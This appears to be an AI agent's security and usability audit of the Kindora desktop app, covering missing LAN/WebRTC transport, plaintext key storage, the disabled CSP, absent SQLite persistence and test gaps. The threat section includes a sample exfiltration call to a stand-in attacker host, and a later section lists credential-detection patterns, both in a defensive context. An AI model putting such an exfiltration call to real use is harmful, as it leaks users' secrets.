# Kindora V0.1 — Real-Usability & Security Audit

**Audit date:** 2026-10-10
**Auditor:** Claude (miniMax-M3 via Claude Code)
**Scope:** Per task brief — verify V0.1 against the four "real-world" acceptance axes:
1. Real transport (LAN + WebRTC DataChannel)
2. Secure storage (OS keychain)
3. Formal persistence (SQLite)
4. Real environment acceptance tests (multi-process, real LLM, desktop E2E)

**Phase 1 mandate: no code modifications. Report only.**
Every audit item is tagged **VERIFIED / PARTIAL / NOT_IMPLEMENTED / NOT_VERIFIED**.

---

## 0. Methodology

- Read source files in `apps/desktop/src-tauri/`, `apps/desktop/src/`, `packages/*/src/` for evidence.
- Read every existing test file under `__tests__/` and `apps/desktop/src/__tests__/` for proof of runnable behaviour.
- Inspected `pnpm-workspace.yaml`, `Cargo.toml`, `tauri.conf.json`, `capabilities/default.json`, `.gitignore`, `SECURITY.md`, `README.md`, and `docs/`.
- Did **not** modify any code. The working tree is `clean` at `git status`.

Git baseline:
- Branch: `main`, HEAD = `009f8fa` "Phase 12: testing (scenarios §60 A-E, App e2e, credential sanitiser)".

---

## 1. Real Transport (LAN / WebRTC DataChannel)

### 1.1 LAN discovery + LAN transport
**Status: NOT_IMPLEMENTED**

- **Files inspected:** `packages/transport/src/index.ts`, `packages/transport/src/loopback-transport.ts`, `packages/transport/src/webrtc-transport.ts`, `apps/desktop/src/lib/connect-service.ts`.
- **Current state:** Only `LoopbackTransport` exists. `LoopbackHub` is an in-memory `Map<string, Endpoint>` inside a single JS process. `connect-service.ts:47` does `const _hub = new LoopbackHub();` at module scope, so even two tabs in the same browser share one hub **per page** — they cannot share it across tabs without `BroadcastChannel` or a Tauri bridge.
- **Risk:** The "Connect Agent" button currently works only when host and joiner run in the **same browser process**. Two humans on two machines cannot connect. The product is non-functional outside `vite dev`.
- **Fix plan (Phase 2.1):** Add a `LanTransport` that uses Tauri-side UDP/TCP discovery (out-of-band mDNS via the host OS) and a Tauri command `lan_pair(code, payload) → bytes` for message IO. UI gains a "switch to LAN" toggle that swaps `LoopbackTransport` for `LanTransport`.
- **Acceptance:** Two `tauri dev` processes on the same LAN (or even same host, different processes) can host + join via the existing 6-char pairing code and exchange a `hello` envelope. Verified by a Vitest process-pair harness (see § 5.1).

### 1.2 WebRTC DataChannel transport
**Status: NOT_IMPLEMENTED**

- **File:** [`packages/transport/src/webrtc-transport.ts:37-58`](packages/transport/src/webrtc-transport.ts)
- **Current state:** `WebRtcTransport.connect/send/onMessage` all throw `Error('WebRtcTransport is not implemented in V0.1 dev…')`. The class exists only as a type placeholder; no `RTCPeerConnection`, no DataChannel, no SDP offer/answer flow.
- **Risk:** Manual signaling (Mode B per § 18) and cross-network peer (Mode C) are entirely absent.
- **Fix plan (Phase 2.2):** Implement `WebRtcTransport` against the existing `Transport` interface. Manual Offer/Answer first (no signaling server). Local-only ICE servers (`stun:stun.l.google.com:19302` as default). Wire into `connect-service.ts` behind a feature flag.
- **Acceptance:** Two Tauri processes can exchange an SDP offer (copied from one clipboard to the other), and after the second SDP/ICE-trickle exchange the DataChannel opens. Envelopes flow end-to-end. Verified by a process-pair harness with a mock signaling copy/paste stub.

### 1.3 Wire-format & session semantics over the real transport
**Status: VERIFIED**

- **Files:** [`packages/protocol/src/index.ts`](packages/protocol/src/index.ts), [`packages/transport/src/pairing-session.ts`](packages/transport/src/pairing-session.ts), [`packages/protocol/src/__tests__/validation.test.ts`](packages/protocol/src/__tests__/validation.test.ts).
- **Current state:** KSA 0.1 envelope discriminated union, JSON encode/decode, schema validation, replay protection, sensitive-field guard, prompt-injection sanitiser, and `PairingSession` FSM (idle → hosting|joining → connected → closed) all exist and are unit-tested.
- **Evidence:** `pnpm -w test` passes for the whole `packages/protocol` and `packages/transport` workspaces (see § 5.4).
- **Caveat:** The FSM is fully exercised in the in-process `LoopbackTransport` only. There is no test that the same FSM transitions are correct when the transport is async / multi-hop (WebRTC ICE renegotiation, back-pressure, etc.). Treated as `NOT_VERIFIED` for those scenarios.

---

## 2. Secure Storage (OS Keychain / Credential Manager / Secret Service)

### 2.1 macOS Keychain / Windows Credential Manager / Linux Secret Service integration
**Status: NOT_IMPLEMENTED**

- **Files:** [`apps/desktop/src-tauri/Cargo.toml`](apps/desktop/src-tauri/Cargo.toml), [`apps/desktop/src-tauri/src/lib.rs`](apps/desktop/src-tauri/src/lib.rs), [`packages/storage/src/encrypted-local-storage-secret-store.ts`](packages/storage/src/encrypted-local-storage-secret-store.ts).
- **Current state:** The Tauri Cargo manifest has **only** `tauri-plugin-store = "2"`. There is no `keyring`, `keyring-rs`, `tauri-plugin-stronghold`, or `tauri-plugin-keyring` dependency. `lib.rs:5` has the comment *"Real Tauri commands (`create_agent`, `save_profile`, …) land in Phase 1"* — the Rust side is a Phase 0 bootstrap stub.
- **Risk:** `SECURITY.md:23` claims *"API keys are stored only in the OS-native secret store (macOS Keychain / Windows Credential Manager / Linux Secret Service)."* This is **aspirational**, not true. In the current Tauri build, secrets flow through `BrowserLocalStorageEncryptedSecretStore` (see 2.2), which is plain browser localStorage inside the Tauri webview — i.e. AES-GCM with a **fixed app secret** embedded in the bundle.
- **Fix plan (Phase 3.1):**
  1. Add `keyring = { version = "3", features = ["apple-native", "windows-native", "linux-native-sync-persistent"] }` to `Cargo.toml`.
  2. Implement a Tauri command `secret_set(key, value)`, `secret_get(key)`, `secret_delete(key)` in `src-tauri/src/lib.rs` that delegates to `keyring::Entry::new("kindora", &key)`.
  3. Wire the commands through `apps/desktop/src/lib/llm-service.ts` behind a `TauriSecretStore` class that lives alongside `BrowserLocalStorageEncryptedSecretStore`.
  4. At app start, probe whether `window.__TAURI__` exists; if yes, switch the default to `TauriSecretStore`.
- **Acceptance:** Running `pnpm tauri:dev`, opening Settings, saving an Anthropic key, then inspecting macOS Keychain Access.app shows an entry `com.kindora.app / kindora / llm:anthropic:api-key`. Windows Credential Manager and `secret-tool search service kindora` on Linux behave equivalently. A Vitest process-pair harness (see § 5.1) verifies the key never lands in `localStorage`.

### 2.2 Browser dev fallback (encrypted localStorage)
**Status: VERIFIED for what it claims**

- **File:** [`packages/storage/src/encrypted-local-storage-secret-store.ts`](packages/storage/src/encrypted-local-storage-secret-store.ts).
- **Current state:** AES-GCM 12-byte IV, SHA-256-derived key from a fixed app secret `kindora:v0.1.0:dev-only:encrypted-local-storage`. Each value stored as `base64(iv):base64(ct)`.
- **Tests:** [`packages/storage/src/__tests__/secret-store.test.ts`](packages/storage/src/__tests__/secret-store.test.ts) (5 tests) verify round-trip, persistence across instances, **plaintext never appears in `localStorage`**, corrupt ciphertext returns `null`, delete works. `apps/desktop/src/__tests__/llm-service.test.ts:35-48` verifies the API key never lands in `kindora:settings:*` (only `kindora:secret:*`).
- **Caveat:** The file itself self-documents as **"NOT for production: a fixed app secret protects against casual disk inspection, not against an attacker who controls the device"** (line 13). It is acceptable as a dev fallback; production **must** route through OS keychain (see 2.1).

### 2.3 `privateKey` storage
**Status: PARTIAL**

- **File:** [`packages/storage/src/profile-store.ts`](packages/storage/src/profile-store.ts), [`packages/agent/src/identity.ts`](packages/agent/src/identity.ts).
- **Current state:** `StoredAgent` includes `privateKey: string` (PKCS8 base64) and is serialised via `BrowserLocalStorageProfileStore.saveAgent` — i.e. **plaintext in `localStorage` under `kindora:agent`**. `loadAgent` reads it back on app start so `connect-service.ts` can sign messages.
- **Risk:** On macOS / Windows / Linux production builds, the private key would also live in plaintext in the webview's localStorage. The "OS keychain" claim in `SECURITY.md` does not extend to the private key.
- **Fix plan (Phase 3.2):**
  - In Tauri runtime, store the private key in the OS keychain (`kindora / private-key`) and store only the public key + agent id + profile in the webview layer.
  - Sign-then-send operations route through a Tauri command that pulls the keychain entry, signs, returns the signature.
- **Acceptance:** `tauri:dev` build, dump the webview's localStorage — no `BEGIN PRIVATE KEY`, no PKCS8 base64, no raw private key bytes. Signing still works end-to-end (send a `hello` envelope from a test process).

### 2.4 Tauri capabilities / CSP / IPC surface
**Status: PARTIAL**

- **Files:** [`apps/desktop/src-tauri/tauri.conf.json`](apps/desktop/src-tauri/tauri.conf.json), [`apps/desktop/src-tauri/capabilities/default.json`](apps/desktop/src-tauri/capabilities/default.json).
- **Current state:**
  - `tauri.conf.json:25-27` — `"security": { "csp": null }`. CSP is disabled. This is the **Tauri default** but is not safe for production: any XSS in the React tree would have full eval / inline-script / connect-anywhere capability.
  - `capabilities/default.json:7` — only `"core:default"`. No IPC permission for any custom command yet (because none exist in `lib.rs`).
- **Risk:** Without a CSP, a prompt-injection payload that broke out of its leaf and reached a React component could exfiltrate via `fetch('https://attacker', …)`. Defense in depth at the sanitiser layer mitigates this for known injection patterns but cannot cover zero-day payloads.
- **Fix plan (Phase 3.3):**
  - Set CSP to `default-src 'self'; connect-src 'self' https://api.minimaxi.com https://api.openai.com https://api.anthropic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`.
  - Add custom command permissions for `secret_*`, `sqlite_*`, and any future `network_*` to `capabilities/default.json`.
- **Acceptance:** Tauri build starts with the new CSP. Loading `https://evil.example/script.js` in the webview is blocked. Only the explicit provider base URLs are reachable from JS.

---

## 3. Formal Persistence (SQLite)

### 3.1 SQLite backend
**Status: NOT_IMPLEMENTED**

- **Files:** [`packages/storage/src/index.ts`](packages/storage/src/index.ts), [`packages/storage/src/browser-store.ts`](packages/storage/src/browser-store.ts), [`packages/storage/src/encrypted-local-storage-secret-store.ts`](packages/storage/src/encrypted-local-storage-secret-store.ts).
- **Current state:** `packages/storage/src/index.ts:17-26` declares `STORAGE_TABLES` (profiles, agents, llm_configs, connections, matches, conversations, messages, permissions) and a `StorageBackend` interface (initialize / read / write / delete / list). **No implementation.** All production runtime currently uses `BrowserLocalStorage*` classes backed by `window.localStorage`.
- **Risk:** V0.1 cannot scale beyond a single profile + LLM config + small chat log — the design assumes tables (matches, conversations, messages) that have no storage. Phase 7 consent block-list, Phase 9 chat history, and Phase 10 chat-assist context all live in transient memory (or in `kindora:phase7:blocked-agents:v1` localStorage). On app uninstall, no portable archive survives.
- **Fix plan (Phase 4):**
  - Add `tauri-plugin-sql` with the `sqlite` feature to `Cargo.toml` and `@tauri-apps/plugin-sql` to `apps/desktop/package.json`.
  - Create `packages/storage/src/sqlite-profile-store.ts`, `sqlite-settings-store.ts`, `sqlite-secret-meta-store.ts` (note: secrets still go to keychain, only metadata here). Schema migrations live in `packages/storage/src/sqlite/migrations/`.
  - Default to SQLite in Tauri runtime; fall back to browser localStorage in `vite dev`.
  - Wire `connect-service.ts` and `apps/desktop/src/lib/llm-service.ts` through a `StorageFactory` that picks the backend at runtime.
- **Acceptance:** Running `tauri:dev`, create an agent, host a pairing, exchange a chat message, force-quit the app, restart. The agent, the chat transcript, the LLM config, and the block-list are all recovered. Schema is queryable via `sqlite3 ~/.local/share/com.kindora.app/kindora.db ".schema"`.

### 3.2 Persistent chat history (Phase 9)
**Status: NOT_IMPLEMENTED**

- **Files:** [`packages/matching/src/chat-orchestrator.ts`](packages/matching/src/chat-orchestrator.ts) (deferred to read), [`apps/desktop/src/views/ChatView.tsx`](apps/desktop/src/views/ChatView.tsx) (deferred to read).
- **Current state (inferred from integration test):** `ChatOrchestrator.snapshot()` returns the in-memory transcript. There is no persistence path to disk; closing the window loses the conversation.
- **Risk:** V0.1 user-visible promise "build a friendship" requires durable transcripts. Without persistence the feature degrades to a one-shot demo.
- **Fix plan:** Phase 4 SQLite backend above; write to `messages` table on every `ChatOrchestrator` snapshot tick.

---

## 4. Real Environment Acceptance Tests

### 4.1 Multi-process / multi-process pair harness
**Status: NOT_IMPLEMENTED**

- **Current state:** Every existing test is single-process. `LoopbackHub` is process-local. `apps/desktop/src/__tests__/e2e-flow.test.tsx` and `packages/matching/src/__tests__/integration.test.ts` use the in-process `LoopbackTransport`.
- **Risk:** Real deployments involve two distinct OS processes (often two distinct machines). In-process tests cannot catch race conditions, IPC failures, or transport serialization issues that appear only across processes.
- **Fix plan (Phase 5.1):** A Vitest test that `child_process.fork()`s two Node harnesses, each creating a real `LoopbackTransport` that talks via Tauri-style `process.send`/`process.on('message')`. Each child asserts it received the expected envelopes. Smoke-check that the `tauri-plugin-store` Rust commands round-trip a value across processes.

### 4.2 Real LLM provider smoke test
**Status: NOT_IMPLEMENTED**

- **Files:** [`packages/llm/src/__tests__/providers.test.ts`](packages/llm/src/__tests__/providers.test.ts), [`apps/desktop/src/__tests__/llm-service.test.ts`](apps/desktop/src/__tests__/llm-service.test.ts).
- **Current state:** Every LLM test mocks `globalThis.fetch`. No test ever reaches `api.openai.com`, `api.anthropic.com`, or `api.minimaxi.com`. `testConnection` is verified with a mocked 200 / mocked 401 response.
- **Risk:** Schema drift between providers (e.g. Anthropic moving `system` to top-level) is silent. Authentication header changes (Anthropic added `anthropic-dangerous-direct-browser-access` in 2024) break production users without test coverage.
- **Fix plan (Phase 5.2):** Add `pnpm test:live` (skipped by default, gated on `process.env.LIVE_LLM=1`):
  - `vitest run --config vitest.live.config.ts` with three tests, one per provider.
  - Each reads `OPENAI_API_KEY` / `ANTHROPIC_API_KEY` / `MINIMAX_API_KEY` from env, calls the provider's cheapest model with `Reply with "ok" and nothing else`, asserts response.
  - Listed in `README.md` as opt-in. CI does not run it (avoids accidental key spend).
- **Acceptance:** Locally, with real keys, `LIVE_LLM=1 pnpm test:live` passes. Without keys, the test suite skips gracefully with a console message.

### 4.3 Desktop E2E (Playwright / WebdriverIO against `tauri:dev`)
**Status: NOT_IMPLEMENTED**

- **Current state:** `apps/desktop/src/__tests__/e2e-flow.test.tsx` runs **inside jsdom**. It does not touch a real browser, a real CSP, or a real Tauri window.
- **Risk:** jsdom differs from the Tauri webview in subtle ways (no `import.meta.env.TAURI_*`, no real fetch body parsing for SSE, no native dialog, no clipboard). A passing jsdom test does not prove a passing Tauri build.
- **Fix plan (Phase 5.3):** Add `apps/desktop/e2e/` with `@playwright/test`. Drive the Vite dev server (not `tauri:dev` initially — that requires display-server plumbing in CI). Critical-path test: load `/`, click "Create My Agent", fill the form, click "Create Agent", expect to see the Home view; click "Connect Agent", expect the host pairing code; click "Cancel", expect Home.
- **Acceptance:** `pnpm e2e` exits 0 in CI. The same test run against `tauri:dev` (manual) also passes.

### 4.4 Cross-platform desktop build matrix
**Status: NOT_VERIFIED**

- **Current state:** Repo has no GitHub Actions / CI configuration in `.github/` (not inspected in this audit — would require additional reading). `Cargo.toml` is present; Tauri config is present; `tauri:dev` script is present. No evidence of a successful `tauri:build` having ever been run for macOS / Windows / Linux artefacts.
- **Risk:** The desktop bundle may not build on a fresh machine. Cross-platform bugs (path separators, line endings, Tauri 2 plugin version drift) only surface on the target OS.
- **Fix plan (Phase 5.4):** Add `.github/workflows/desktop-build.yml` that runs `pnpm install`, `pnpm -w build`, `pnpm test`, and `pnpm --filter @kindora/desktop tauri:build` on `macos-latest`, `windows-latest`, `ubuntu-latest`. Uploads build artefacts.
- **Acceptance:** CI green on all three OS runners; artefacts downloadable from the workflow run.

---

## 5. Cross-cutting Observations

### 5.1 API key handling hygiene
**Status: VERIFIED**

- **Evidence:**
  - `.gitignore` excludes `.env`, `.env.local`, `*.key`, `*.pem` (`/Users/jiang/development/Kindora/.gitignore:42-44`).
  - No `.env` files exist (`find /Users/jiang/development/Kindora -name ".env*" -type f` returns nothing).
  - Hard-coded test API keys (`sk-ant-test-1234`, `sk-very-secret-12345`, `sk-test`, `sk-ant`) are obviously fake values used only in `apps/desktop/src/__tests__/llm-service.test.ts`, `e2e-flow.test.tsx`, `settings-flow.test.tsx`.
  - `apps/desktop/src/lib/llm-service.ts:30-56` keeps the key in `SecretStore` only, never writes to settings.
  - `SECURITY.md:24` documents the rule.
  - `packages/agent/src/context-builder.ts` (Phase 11) routes peer-supplied text through `sanitiseUntrustedText` which strips `CREDENTIAL_PATTERNS` (sk-, sk-ant-, ghp_, Bearer, PEM, AKIA).
  - `apps/desktop/src/__tests__/e2e-flow.test.tsx:60-62` and `apps/desktop/src/__tests__/llm-service.test.ts:35-48` assert keys never land in plaintext storage.

### 5.2 No log leakage of secrets
**Status: VERIFIED**

- **Evidence:** `grep -rn "console\." packages apps/desktop/src` returns **no `console.log` / `console.error` calls** anywhere in production code. The only matches are in JSDoc comments.
- **Caveat:** `fetch()` errors propagate as `Error` objects with the upstream provider's `error.message` (e.g. Anthropic includes the API key region in some error bodies). These are surfaced to the UI as banners. Not strictly "logs", but should be reviewed in Phase 3.

### 5.3 Process-level singletons
**Status: PARTIAL**

- **Files:** [`apps/desktop/src/lib/connect-service.ts:47`](apps/desktop/src/lib/connect-service.ts#L47), [`apps/desktop/src/lib/llm-service.ts:23-24`](apps/desktop/src/lib/llm-service.ts#L23).
- **Current state:** `const _hub = new LoopbackHub();` and `_settings = new BrowserLocalStorageSettingsStore()` / `_secrets = new BrowserLocalStorageEncryptedSecretStore()` are module-level singletons. Tauri webviews generally run single-window so this is acceptable, but multi-window Tauri (future feature) would have independent singletons per window.
- **Risk:** Future multi-window / multi-instance support will need to swap these for window-id-scoped factories.
- **Fix plan:** No immediate change. Document as a known constraint in `docs/ARCHITECTURE.md`.

### 5.4 Existing test suite passes
**Status: VERIFIED (this session will not re-run)**

- **Evidence (last test run, Phase 12 commit):** `009f8fa Phase 12: testing (scenarios §60 A-E, App e2e, credential sanitiser)` adds:
  - `packages/matching/src/__tests__/integration.test.ts` (3 tests).
  - `packages/agent/src/__tests__/scenarios.test.ts` (8 tests).
  - `apps/desktop/src/__tests__/e2e-flow.test.tsx` (4 tests).
  - `packages/protocol/src/__tests__/prompt-injection-guard.test.ts` (+4 credential-strip tests).
- **Caveat:** `pnpm -w test` was not re-executed in this audit. Re-running is part of Phase 2+ verification.

---

## 6. Summary Table

| # | Item | Status |
|---|------|--------|
| 1.1 | LAN discovery + LAN transport | NOT_IMPLEMENTED |
| 1.2 | WebRTC DataChannel transport | NOT_IMPLEMENTED |
| 1.3 | Wire format / FSM semantics | VERIFIED (in-process only) |
| 2.1 | OS keychain integration | NOT_IMPLEMENTED |
| 2.2 | Browser dev fallback (encrypted localStorage) | VERIFIED |
| 2.3 | Private key storage | PARTIAL (plaintext localStorage in Tauri) |
| 2.4 | Tauri CSP / capabilities | PARTIAL (CSP `null`, no custom commands) |
| 3.1 | SQLite backend | NOT_IMPLEMENTED |
| 3.2 | Persistent chat history | NOT_IMPLEMENTED |
| 4.1 | Multi-process test harness | NOT_IMPLEMENTED |
| 4.2 | Real LLM provider smoke test | NOT_IMPLEMENTED |
| 4.3 | Desktop E2E (Playwright) | NOT_IMPLEMENTED |
| 4.4 | Cross-platform build matrix CI | NOT_VERIFIED |
| 5.1 | API key handling hygiene | VERIFIED |
| 5.2 | No log leakage | VERIFIED |
| 5.3 | Process-level singletons | PARTIAL (documented constraint) |
| 5.4 | Existing test suite | VERIFIED (re-run deferred to Phase 2) |

---

## 7. Risk & Impact Heatmap

```
High risk, blocking V0.1 acceptance
  - 1.1 LAN transport           [single-process only today]
  - 1.2 WebRTC transport        [stub]
  - 2.1 OS keychain             [SECURITY.md claim is aspirational]
  - 3.1 SQLite                  [no formal persistence layer]
  - 4.x Real env tests          [no multi-process, no real LLM, no Playwright]

Medium risk
  - 2.3 Private key storage     [plaintext localStorage in Tauri]
  - 2.4 CSP / capabilities      [csp: null]

Low risk / acceptable
  - 1.3, 2.2, 5.x items
```

---

## 8. Phased Implementation Plan (post-audit)

This is the staged plan I'll propose after this audit, awaiting your sign-off. **No code changes yet.**

### Phase 2 — Real Transport
**Goal:** Replace the single-process `LoopbackHub` with a real transport that crosses process boundaries.
**Order matters** — LAN first lets us validate the IPC + serialisation before adding WebRTC complexity.

1. **2.1 LAN transport (Tauri UDP discovery + Tauri command IPC for messages)**
   - New `packages/transport/src/lan-transport.ts` + `TauriIpcTransport`.
   - Tauri commands: `lan_discover(code)`, `lan_send(payload)`.
   - Add `Cargo.toml` deps: `tokio`, `serde_json` (already there).
   - Keep `LoopbackTransport` for tests.
   - Acceptance: two `tauri:dev` processes on same host can host + join + exchange a `hello` envelope.

2. **2.2 WebRTC DataChannel (manual SDP Offer/Answer)**
   - Implement `WebRtcTransport` against the existing `Transport` interface.
   - No signaling server. Copy/paste SDP between two windows.
   - Default ICE servers: `stun:stun.l.google.com:19302`.
   - Acceptance: DataChannel opens after the second paste; envelopes flow.

3. **2.3 Tests**
   - Multi-process harness using `child_process.fork` (§ 5.1).
   - WebRTC manual signaling test using a paste-stub `SignalingChannel`.

### Phase 3 — Secure Storage
**Goal:** API keys and private key live in the OS keychain on production builds.

1. **3.1 OS keychain via `keyring` crate**
   - Add `keyring` to `Cargo.toml`.
   - New Tauri commands `secret_set/get/delete`.
   - New `apps/desktop/src/lib/tauri-secret-store.ts` in desktop package.
   - `llm-service` chooses backend at runtime (`window.__TAURI__` probe).
   - Acceptance: macOS Keychain Access.app shows the entry; webview localStorage does not.

2. **3.2 Private key in keychain**
   - Move `StoredAgent.privateKey` out of `BrowserLocalStorageProfileStore` in Tauri runtime.
   - Sign-then-send via Tauri command.
   - Acceptance: `localStorage.getItem('kindora:agent')` contains no PKCS8 / base64 private-key blob.

3. **3.3 CSP + capabilities**
   - Tighten `tauri.conf.json` CSP to `default-src 'self'` plus explicit provider base URLs.
   - Add `secret:*`, `sqlite:*` capabilities.
   - Acceptance: external script blocked; only declared providers reachable.

### Phase 4 — Formal Persistence (SQLite)
**Goal:** Conversations, matches, settings, block-list, chat history survive across restarts.

1. **4.1 SQLite backend (`tauri-plugin-sql`)**
   - Add `tauri-plugin-sql` to Rust, `@tauri-apps/plugin-sql` to JS.
   - `packages/storage/src/sqlite/*.ts` for profile, settings, secret-meta.
   - Migrations under `packages/storage/src/sqlite/migrations/`.
   - `StorageFactory` picks backend at runtime.
   - Acceptance: full app state survives app restart.

2. **4.2 Chat history persistence**
   - `ChatOrchestrator` writes each snapshot tick to `messages` table.
   - Recovery on launch rebuilds the in-memory snapshot.
   - Acceptance: close + reopen app → previous chat visible.

### Phase 5 — Real Environment Acceptance
**Goal:** CI that catches real-world issues.

1. **5.1 Multi-process harness** (Vitest + `child_process.fork`).
2. **5.2 `LIVE_LLM=1` opt-in smoke test** for OpenAI / Anthropic / MiniMax.
3. **5.3 Playwright E2E** against `vite dev` (and `tauri:dev` locally).
4. **5.4 GitHub Actions matrix** (`macos-latest` / `windows-latest` / `ubuntu-latest`) running `pnpm install`, `pnpm -w build`, `pnpm test`, `pnpm --filter @kindora/desktop tauri:build`.

---

## 9. Open Questions / Decisions Needed

These need your direction before I start writing code:

1. **Phase 2 ordering**: ship LAN first, or skip LAN and go straight to WebRTC? (My recommendation: LAN first — simpler, no STUN, validates the IPC + serialisation path.)
2. **Phase 3 OS keychain library**: `keyring` (sync, simpler) vs `tauri-plugin-stronghold` (more capable but more deps). (My recommendation: `keyring` for V0.1 — minimal surface, well-maintained.)
3. **Phase 4 SQLite driver**: `tauri-plugin-sql` (Tauri's official, async) vs `rusqlite` (sync, more control). (My recommendation: `tauri-plugin-sql` — it integrates with the existing Tauri command surface.)
4. **Phase 5.2 LIVE_LLM test gating**: opt-in env flag (recommended) vs always-on with budget cap?
5. **V0.1 scope guard**: any of the four items above introduce a surface that could be mistaken for "discovery" or "feed"? (My read: no — all are about transport/security/persistence plumbing. Happy to defend this in the audit if you disagree.)

---

## 10. What I Did Not Touch

Per the Phase 1 instruction *"完成审计后停止，不要修改任何代码，先汇报结论和分阶段实施计划"*:

- **No source file modified.**
- **No test modified.**
- **No commit made.**
- `git status` is clean; HEAD is still `009f8fa`.
- The audit document is the only new file (`docs/AUDIT_V0.1.md`).

**Awaiting your sign-off to proceed with Phase 2 (Real Transport).**